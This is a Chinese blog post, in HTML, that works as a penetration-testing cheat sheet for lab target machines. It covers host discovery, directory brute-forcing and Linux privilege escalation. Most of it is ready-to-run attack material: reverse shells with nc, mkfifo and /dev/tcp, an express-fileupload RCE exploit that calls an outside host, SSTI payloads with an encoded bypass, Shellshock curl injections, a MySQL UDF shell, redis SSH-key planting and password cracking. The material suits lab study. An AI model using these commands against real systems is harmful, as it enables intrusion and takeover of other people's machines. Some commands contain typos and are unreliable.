@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="">
+  <title>渗透学习靶机打靶思路与方法 | Love is a Moment Story</title>
+  <meta name="author" content="zhang rui" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="" />
+  
+  <meta name="description" content="一．对靶机进行信息收集1.首先对目标存活靶机发起嗅探： ①sudo arp-scan -l 针对网卡发起扫描存活主机 ②arping扫描：for i in (seq 1 254);do arping −c 2 10.0.2.i; done ③netdiscover：sudo netdiscover -r 10.0.2.0&#x2F;16 ④nmap主机发现：nmap -sn 10.0.2.4&#x2F;24 ⑤fpi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透学习靶机打靶思路与方法">
+<meta property="og:url" content="http://example.com/2022/11/30/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%96%B9%E6%B3%95/index.html">
+<meta property="og:site_name" content="Love is a Moment Story">
+<meta property="og:description" content="一．对靶机进行信息收集1.首先对目标存活靶机发起嗅探： ①sudo arp-scan -l 针对网卡发起扫描存活主机 ②arping扫描：for i in (seq 1 254);do arping −c 2 10.0.2.i; done ③netdiscover：sudo netdiscover -r 10.0.2.0&#x2F;16 ④nmap主机发现：nmap -sn 10.0.2.4&#x2F;24 ⑤fpi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/null">
+<meta property="article:published_time" content="2022-11-30T10:15:09.000Z">
+<meta property="article:modified_time" content="2022-12-06T06:24:02.947Z">
+<meta property="article:author" content="zhang rui">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/null">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner.webp');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Love is a Moment Story" type="application/atom+xml">
+</head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/coffee/"><i class="fa fa-coffee"></i>生活日常</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-paper-plane"></i>关于我</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a href="/about/">自我介绍</a></li>
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://zr-blog.github.io/">作者博客</a></li>
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://github.com/zr-blog">项目链接</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Love is a Moment Story</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Love is a Moment Story</h2> <br />
+                        <span>im very vegatable and very poor</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article>
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center">渗透学习靶机打靶思路与方法</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><i class="fa fa-calendar"></i> 2022-11-30</li>
+                <li><i class="fa fa-user"></i> 作者 zhang rui</li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~9.73K
+                    
+                    字
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                本文最后编辑于 <time datetime="1670307842947"></time> 前，其中的内容可能需要更新。
+            </div>
+            
+                <div class="kratos-post-inner-toc">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%EF%BC%8E%E5%AF%B9%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">一．对靶机进行信息收集</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number"></span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%EF%BC%8E%E4%B8%80%E4%BA%9B%E9%9D%B6%E6%9C%BA%E6%89%93%E7%82%B9%E7%9A%84%E5%B7%A5%E5%85%B7%E5%92%8C%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">二．一些靶机打点的工具和知识：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%EF%BC%8E%E8%BF%9B%E8%A1%8Clinux%E4%B8%8B%E7%9A%84%E6%8F%90%E6%9D%83"><span class="toc-number"></span> <span class="toc-text">三．进行linux下的提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%EF%BC%8E%E6%80%BB%E7%BB%93"><span class="toc-number"></span> <span class="toc-text">四．总结</span></a>
+                </div>
+            
+            <hr />
+            <h2 id="一．对靶机进行信息收集"><a href="#一．对靶机进行信息收集" class="headerlink" title="一．对靶机进行信息收集"></a><strong>一．对靶机进行信息收集</strong></h2><p><strong>1.首先对目标存活靶机发起嗅探：</strong></p>
+<p>①sudo arp-scan -l 针对网卡发起扫描存活主机</p>
+<p>②arping扫描：for i in (seq 1 254);do arping −c 2 10.0.2.i; done</p>
+<p>③netdiscover：sudo netdiscover -r 10.0.2.0/16</p>
+<p>④nmap主机发现：nmap -sn 10.0.2.4/24</p>
+<p>⑤fping侦探：fping -gaq 10.0.2.0/24</p>
+<p><strong>2.对目标主机开放端口及服务发起探测</strong></p>
+<p>①masscan快速扫描</p>
+<p>②nmap进行扫描</p>
+<p>(1)nmap -p- ip </p>
+<p> (2)nmap -p22,80,.. -A ip </p>
+<p>(3)当目标主机开启防火墙时：nmap –script=firewalk –traceroute ip 详细绕过文章参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43510203/article/details/107596120">https://blog.csdn.net/weixin_43510203/article/details/107596120</a></p>
+<p><strong>3.对非web端口的服务发起迅速的嗅探，尝试使用nday进行攻击</strong></p>
+<p>①kali自带的exploitdb</p>
+<p>②msf进行攻击嗅探</p>
+<p>③可以使用搜索引擎尝试搜索最新还未收录的day</p>
+<p>④对如mysql及ssh端口开放的服务可以使用hydra进行密码的爆破</p>
+<p><strong>4.开始进行web端口外部打点尝试</strong></p>
+<p>首先对目标端口开放的功能点发起测试，</p>
+<p>如登录框，弱密码，xss，爆破，sql注入等，尝试能否直接拿到shell，</p>
+<p><strong>如果首界面得不到有效信息</strong>，开始进行路径爆破，对路径爆破得到的路径进行详细的侦测，流程及思路与测试主页面一致，</p>
+<p>将大量收集得到的信息进行整合记录，查看每一个收集得到的路径的页面源代码</p>
+<p>如果发现有<strong>子域名未绑定</strong>，搜集得到的子域名进行绑定，再次对子域名发起攻击，包括中间件及应用，通过searchsploit搜索可以利用的版本漏洞尝试进行突破，这是外部打点最为重要的一步。</p>
+<p>①使用feroxbuster进行路径发现：feroxbuster –url <a target="_blank" rel="noopener" href="http://10.0.2.9/">http://10.0.2.9</a></p>
+<p>②使用gobuster进行路径发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.26-w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp</span><br></pre></td></tr></table></figure>
+
+<p>使用gobuster进行更加针对性的扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -r -u http://10.0.2.16/-x txt,html,php -w /usr/share/seclists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure>
+
+<p>使用gobuster进行子域名的爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）gobuster vhost -u http://cereal.ctf:44441-w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt</span><br><span class="line">（2）gobuster vhost -u http://votenow.local/-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt | grep “Status:200”</span><br></pre></td></tr></table></figure>
+
+<p>③构建自己的参数字典进行参数爆破：123abc’”(&lt;,;/%</p>
+<p>④使用fuff进行双参数爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt :PARAM</span><br></pre></td></tr></table></figure>
+
+<p>-w val.txt:VAL -u <a target="_blank" rel="noopener" href="http://10.0.2.26/secret/evil.php?PARAM=VAL-fs">http://10.0.2.26/secret/evil.php?PARAM=VAL-fs</a> 0 -fs</p>
+<p>是为了过滤掉无效的内容</p>
+<p>使用fuff进行模糊参数爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt-u http://10.0.2.26/secret/evil.php?FUZZ=…/index.html-fs 0</span><br></pre></td></tr></table></figure>
+
+<p>⑤使用dirsearch进行路径爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（1）dirsearch -u http://10.0.2.43-f -e html,php,txt -w /usr/share/seclists/Discovery/WebContent/directory-list-2.3-small.txt（2）dirsearch -u http://10.1.8.133-f -e html,php,txt -w /usr/share/wordilsts/dirb/common.txt</span><br></pre></td></tr></table></figure>
+
+<p>⑥利用cewl生成特定的字典</p>
+<p>⑦利用dirb来进行路径爆破 使用dirb进备份文件检查 dirb <a target="_blank" rel="noopener" href="http://cereal.ctf/blog/-x">http://cereal.ctf/blog/-x</a> .bak,back</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="二．一些靶机打点的工具和知识："><a href="#二．一些靶机打点的工具和知识：" class="headerlink" title="二．一些靶机打点的工具和知识："></a><strong>二．一些靶机打点的工具和知识：</strong></h1><p><strong>1.当目标靶机nc中不存在-e参数时两种串联攻击方法：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）nc 10.0.2.4 3333 | /bin/bash | nc 10.0.2.4 4444 </span><br><span class="line">（2）rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.2.15 3333 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.cyberchef平台上可以进行多种多样的加密与解密</strong></p>
+<p><strong>3.node.js下的express-fileupload模块存在参数污染远程命令代码执行漏洞</strong></p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">cmd = ‘bash -c “bash -i &amp;&gt; /dev/tcp/p6.is/8888 0&gt;&amp;1”’</span><br><span class="line">pollute</span><br><span class="line">requests.post(‘http://p6.is:7777’, files = &#123;‘proto.outputFunctionName’: (None,</span><br><span class="line">f&quot;x;console.log(1);process.mainModule.require(‘child_process’).exec(‘&#123;cmd&#125;’);x&quot;)&#125;)execute command</span><br><span class="line">requests.get(‘http://p6.is:7777’)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>4.node是一个类似于java的运行环境，</strong></p>
+<p>利用node反弹shell，sudo node -e ‘child_process.spawn(“/bin/bash”,{stdio:[0,1,2]})’</p>
+<p><strong>5.bash指令受限为非交互式的shell时的详细操作（只适用于bshell）：</strong></p>
+<p>ctrl+z 将获得的shell进程隐藏</p>
+<p>stty raw -echo stty echo 取消不显设置 rstty时一个用来改变并打印终端行设置的常用命令。</p>
+<p>fg 将后台的命令调到前台来 发现仍然无法正常执行，原因是因为kali</p>
+<p>上面用的是zshell不是bshell，但是目标靶机上用的是bshell</p>
+<p>chsh -s /bin/bash 将kali上的zshell改为bshell</p>
+<p>ctrl+r 重启kali</p>
+<p>echo $SHELL 得到bshell</p>
+<p>重启后:stty raw -echo</p>
+<p>这个地方如果出现执行后无法执行命令，输入python3 -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
+<p>就可以得到www-data@wp:/var/www/html/wordpress$</p>
+<p>export SHELL=/bin/bash</p>
+<p>export TREM=screen</p>
+<p>stty rows 38 columns 116</p>
+<p>reset</p>
+<p>发现已经实现了所有的功能包括补齐等等</p>
+<p><strong>6.不管是打靶还是在真实的渗透测试中，都需要尽可能的多获得shell，以确保自己有足够的的shell</strong></p>
+<p><strong>7.xmlrpc可以远程执行命令：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import xmlrpc.client</span><br><span class="line">with xmlrpc.client.ServerProxy(“http://localhost:8000/”) as </span><br><span class="line">proxy:</span><br><span class="line">print(str(proxy.cpu()))</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>8.文件包含下的重点伪协议读取</strong></p>
+<p>（1）php：php://filter/convert.base64-encode/resource=evil.php</p>
+<p>（2）gophor协议下的ssrf工具 git clone <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus.git">https://github.com/tarunkant/Gopherus.git</a></p>
+<p><strong>9.当可以任意读取目标靶机文件时，利用访问公私钥免于账号密码登录</strong></p>
+<p>默认存放位置:公钥 /home/kali/.ssh/authorized_keys 私钥 /home/kali/id_rsa</p>
+<p>将拷贝下来的私钥赋予600权限 chmod 600 id_rsa</p>
+<p>如果私钥也被加密：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ssh2john.py ~/id_rsa &gt; ~/hash 进行转化john hash --wordlist=rockyou.txt 破解得到了密码文</span><br></pre></td></tr></table></figure>
+
+<p><strong>10.有时候如果没有tcp传输的端口，可以怀疑udp53端口作为同一个域之间传输数据的方式，扫描udp53端口 sudo nmap -p53 -sU 10.0.2.15</strong></p>
+<p><strong>11.在hosts更改绑定后发现主机记录没有改变时，可以使用dns区域访问，</strong>axfr区域传输后会返回域名下的所有记录，dig axfr @10.0.2.28 blackhat.local发现存在axfr漏洞，发现存在新域名,均绑定到hosts里面</p>
+<p><strong>12.模板注入通杀代码：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;1+abcxyz&#125;&#125;$&#123;1+1bcxyz&#125;%3C%1+abcxyz%%3E[acbxyz]$&#123;77&#125;,&#123;&#123;77&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>利用模板注入漏洞进行反弹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% import os %&#125;&#123;&#123;os.system(‘bash -c “bash -i &gt;&amp; /dev/tcp/10.0.2.7/4444 0&gt;&amp;1”’)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如果被过滤掉可以对编码进行混淆绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%7B%25%20import%20os%20%25%7D%7B%7Bos.system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.15%2F4444%2000%3E%261%22%27%29%7D%7D</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>13.对网站指纹进行探测：whatweb</strong></p>
+<p><strong>14.对页面403做403页面绕过</strong></p>
+<p>①旁站绕过403：将主机名进行替换</p>
+<p>②覆盖URL进行绕过：</p>
+<p>GET / HTTP/1.1</p>
+<p>X-Original-URL: /auth/login</p>
+<p>或者X-Rewrite-URL</p>
+<p>X-Oringinating-IP:127.0.0.1 X-Forwarded-For:127.0.0.1 X-Remote-IP:127.0.0.1</p>
+<p>③通过referer头部修改</p>
+<p>ReFerer:<a target="_blank" rel="noopener" href="http://xxx/auth/login">http://xxx/auth/login</a></p>
+<p><strong>15.john进行密码爆破</strong></p>
+<p>首先将文件保存成hash值zip2john a.zip &gt;hash</p>
+<p>将wordlists里的Rockyou字典解压保存到桌面</p>
+<p>john hash –wordlists=rockyou.txt得到密码ragnarok123</p>
+<p><strong>16.使用steghide工具进行探测隐写数</strong>，steghide info king 使用binwalk进行二进制的分析，binwalk -B king</p>
+<p><strong>17.rpyc远程管理进行提权 添加sudo权限的exp</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import rpyc</span><br><span class="line">def shell():</span><br><span class="line">import os</span><br><span class="line">os.system(“sudo usermod -a -G sudo ragnar”)</span><br><span class="line">conn = rpyc.classic.connect(“localhost”)</span><br><span class="line">fn=conn.teleport(shell)</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure>
+
+<p><strong>18.利用破壳漏洞进行打点</strong></p>
+<p>（1）查看所有的后缀名为cgi，sh的文件，使用破壳漏洞尝试控制系统</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.36/cgi-bin/-f -e cgi,sh</span><br></pre></td></tr></table></figure>
+
+<p>发现带有这些后缀名的文件返回状态码500</p>
+<p>（2）使用nmap进行破壳漏洞进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 10.0.2.16</span><br><span class="line">nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/backup.cgi,cmd=ls 10.0.2.16</span><br></pre></td></tr></table></figure>
+
+
+
+<p>发现均存在破壳漏洞</p>
+<p>（3）使用curl工具进行参数的注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -H “user-agent: () &#123; :; &#125;, echo; echo; /bin/bash -c ‘which nc’” \http://10.0.2.16/cgi-bin/shell.sh</span><br><span class="line">curl -H “user-agent: () &#123; :; &#125;, echo; echo; /bin/bash -c ‘nc -e /bin/bash 10.0.2.15 4444’” \http://10.0.2.16/cgi-bin/shell.sh</span><br></pre></td></tr></table></figure>
+
+
+
+<p>本机开启侦听端口，发现连接成功突破外部拿下shell</p>
+<p><strong>19.StegSeek高效的密码爆破工具</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegseek --crack doubletrouble.jpg rockyou.txt 破解密码成功</span><br></pre></td></tr></table></figure>
+
+<p>再加上-xf参数得到文件fil</p>
+<p><strong>20.当存在火狐存储的账号密码时，</strong>可以使用firefox_decrypt-master工具进行破解得到账号密码</p>
+<p><strong>21.fernet，是</strong>一种python下的加密算法,解密代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from cryptography.fernet import Fernet</span><br><span class="line">key = b’…’</span><br><span class="line">f = Fernet(key)</span><br><span class="line">token =b’…’</span><br><span class="line">f.decrypt(token)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>22.WebDAV服务漏洞利用工具DAVTest:</strong></p>
+<p>davtest -url <a target="_blank" rel="noopener" href="http://10.1.8.133/webdav-auth">http://10.1.8.133/webdav-auth</a> yamdoot:Swarg</p>
+<p>上传反弹shell的php文件 /usr/share/webshells/php/php-reverse-shell.php</p>
+<p>davtest -url <a target="_blank" rel="noopener" href="http://10.1.8.133/webdav-auth">http://10.1.8.133/webdav-auth</a> yamdoot:Swarg -uploadfile php-reverse-shell.php</p>
+<p>-uploadloc rev.php</p>
+<p><strong>23.wkhtmltppdf组件，</strong>可以将html代码转换成pdf，该组件下存在exp可以远程执行文件，在原来xss的地方尝试读取文件</p>
+<p><strong>24.enum4linux是Kali Linux自带的一款信息收集工具。</strong>它可以收集Windows系统的大量信息，如用户名列表、主机列表、共享列表、密码策略信息、工作组和成员信息、主机信息、打印机信息等等。该工具主要是针对Windows NT/2000/XP/2003，但在Windows 7/10系统，部分功能受限</p>
+<p><strong>25.rbash绕过：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa tom@192.168.182.135 -t “bash --noprofile”</span><br><span class="line">sudo mysql -u tom -p</span><br><span class="line">! Bash</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>26.针对139及445端口的smb服务发起攻击</strong>，使用smbclient工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L \\191.268.182.147</span><br><span class="line">smbclient -L \\191.268.182.147\\ITDEPT</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="三．进行linux下的提权"><a href="#三．进行linux下的提权" class="headerlink" title="三．进行linux下的提权"></a><strong>三．进行linux下的提权</strong></h1><p><strong>1.首先使用 uname -a lsb_release -a对目标靶机进行版本机内核信息收集，</strong>使用exploitdb内的内核版本漏洞尝试能否直接提权</p>
+<p>两个需要特别注意的内核漏洞：</p>
+<p>（1）脏牛内核漏洞：</p>
+<p>漏洞范围：linux kernel 4.8.3, 4.7.9, 4.4.2&gt;Linux内核 &gt;= 2.6.22</p>
+<p>（2）CVE-2021-3493：</p>
+<p>影响版本Ubuntu 20.10 Ubuntu 20.04 LTS Ubuntu 18.04 LTS Ubuntu 16.04 LTS Ubuntu 14.04 ESM</p>
+<p>还可以使用linux-exploit-suggester进行自动化枚举内核的提权漏洞</p>
+<p><strong>2.查找suid权限的文件</strong>，尝试进行权限继承或者通过该文件的内容发起进一步探索</p>
+<p>权限继承 例：一个名为update_cloudav的文件 权限为rwsr 即存在suid权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./update_cloudav “a | nc 10.0.2.4 5555 | /bin/bash |nc 10.0.2.4 6666”进行suid</span><br></pre></td></tr></table></figure>
+
+<p>权限继承</p>
+<p><strong>3.进行sudo权限检查 s</strong>udo -l 尝试利用sudo权限获得root权限例</p>
+<p>当awk存在root权限时，使用命令进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk ‘BEGIN &#123;system(“/bin/bash”)&#125;’</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>4.su提权：</strong>需要多注意自己得到过的有效密码信息，尝试看能不能直接提权</p>
+<p><strong>5.mysql数据库提权：</strong></p>
+<p>（1）输入! bash !可以直接执行系统命令，！是system函数的简写，跳出mysql直接得到root权限（</p>
+<p>（2）udf提权：</p>
+<p>find / -iname”mysqludf” -type f 2&gt;/dev/null linux 的so等于windos的dll 都属于动态链接的文件</p>
+<p>show variable like ‘%plugins%’           将该文件传到目标靶机上去，查看mysql的插件，得到存放插件的路径为/usr/lib/mysql/plugin/ 将so文件写入到插件里面，再创建可以执行命令的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql</span><br><span class="line">create table aaa(line blob);</span><br><span class="line">insert into aaa values(load_file(‘/tmp/udf.so’));</span><br><span class="line">select * from aaa into dumpfile /usr/lib/mysql/plugin/</span><br><span class="line">create function sys_exec returns integer soname ‘udf.so’;</span><br><span class="line">select sys_exec(‘id &gt; /tmp/out.txt’);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查看目录里面发现执行成功，开始写入反弹shell的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sysy_exex(‘nc 10.0.2.15 4444 -e /bin/bash’);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>6.检查/etc/passwd是否具有可写权限，</strong>可以尝试将账号密码直接写入得到root权限，openssl passwd -1 -1指的是一种加密算法，将加密后的密码写入passw中的root账号</p>
+<p><strong>7.利用capabilities进行提权：</strong>例：</p>
+<p>capabilities是一个权限管理功能，设置权限赋予</p>
+<p>setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap</p>
+<p>首先进行查询指令 /sbin/getcap getcap -r / 2&gt;/dev/null</p>
+<p>发现一个python2.7的程序拥有capabilities权限</p>
+<p>ps -U root 查看所有以root账号运行的进程 或者 ps -aef | grep root</p>
+<p>下载利用权限利用的python进程注入脚本wget</p>
+<p>python2.7 inject.py 862 默认侦听端口为5600</p>
+<p><strong>8.检测系统内账号目录或者敏感目录下有没有定时任务，</strong>可以使用pspy工具监视操作系统进程的创建活动，查看是否有定时任务执行或者可以定时执行带root权限的脚本，尝试将反弹语句写入到脚本中</p>
+<p><strong>9.利用linux自带的命令进行漏洞提权</strong> 详细查询网站：</p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<p>Sudo提权漏洞CVE-2021-3156 Sudo 1.8.2-31p2，Sudo 1.9.0-5p1 </p>
+<p>影响的Linux版本：Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 Debian 10.0</p>
+<p><strong>10.利用motd（message of the day）进行提权</strong>,motd是一个访问运行脚本的目录，尝试对找到的进程进行注入echo ‘root:123’ | chpasswd</p>
+<p><strong>11.利用redis进行提权：</strong></p>
+<p>cd .ssh</p>
+<p>.ssh$ nc -nvlp 4444 &gt; authorized_keys</p>
+<p>ssh-keygen -t rsa</p>
+<p>cd .ssh</p>
+<p>nc 10.1.8.138 4444&lt; id_rsa.pub -w 1</p>
+<p>ssh登录账号成功</p>
+<p>redis-cli -a 密码登录成功</p>
